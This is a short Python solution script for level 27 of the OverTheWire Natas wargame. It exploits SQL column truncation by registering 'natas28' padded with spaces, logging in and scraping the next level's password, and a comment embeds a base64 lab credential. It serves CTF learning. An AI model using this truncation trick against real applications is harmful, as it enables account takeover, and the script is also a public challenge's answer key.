import requests
import re
from requests.auth import HTTPBasicAuth
def solve27(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyNzo1NVRCanBQWlVVSmdWUDViM0JuYkc2T045dURQVnpDSg=="
    session.headers["Content-Type"] = "application/x-www-form-urlencoded"
    url = "http://natas27.natas.labs.overthewire.org/"
    session.post(url, data="username=natas28" + " "*64 + "test&password=testing")
    resp = session.post(url, data="username=natas28&password=testing")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw

